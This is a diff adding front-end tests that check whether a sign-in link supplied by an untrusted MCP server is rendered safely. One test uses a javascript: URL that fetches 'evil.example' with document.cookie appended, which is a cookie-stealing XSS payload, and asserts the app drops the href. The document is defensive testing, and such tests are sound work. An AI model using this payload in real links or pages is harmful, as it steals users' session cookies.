@@ -296,3 +296,35 @@ describe('a sign-in that could not start', () => {
     });
   });
 });
+
+describe('the sign-in link an MCP server supplied', () => {
+  // `authorizeUrl` is written by the remote MCP server — one of the least
+  // trusted strings the app renders. It used to reach a bare `<a href>` with
+  // none of the link seam in the path (DOR-924).
+  it('links to a well-formed https authorize URL', async () => {
+    const user = userEvent.setup();
+    const transport = createMockTransport();
+    vi.mocked(transport.startMcpSignin).mockResolvedValue(startResult);
+    renderHarness(transport);
+
+    await user.click(screen.getByRole('button', { name: 'Sign in' }));
+
+    const link = await screen.findByText('Open the sign-in page');
+    expect(link.closest('a')?.getAttribute('href')).toBe(startResult.authorizeUrl);
+  });
+
+  it('renders no href when the server names a scheme the app refuses', async () => {
+    const user = userEvent.setup();
+    const transport = createMockTransport();
+    vi.mocked(transport.startMcpSignin).mockResolvedValue({
+      ...startResult,
+      authorizeUrl: 'javascript:fetch("https://evil.example/"+document.cookie)',
+    });
+    renderHarness(transport);
+
+    await user.click(screen.getByRole('button', { name: 'Sign in' }));
+
+    const link = await screen.findByText('Open the sign-in page');
+    expect(link.closest('a')?.hasAttribute('href')).toBe(false);
+  });
+});
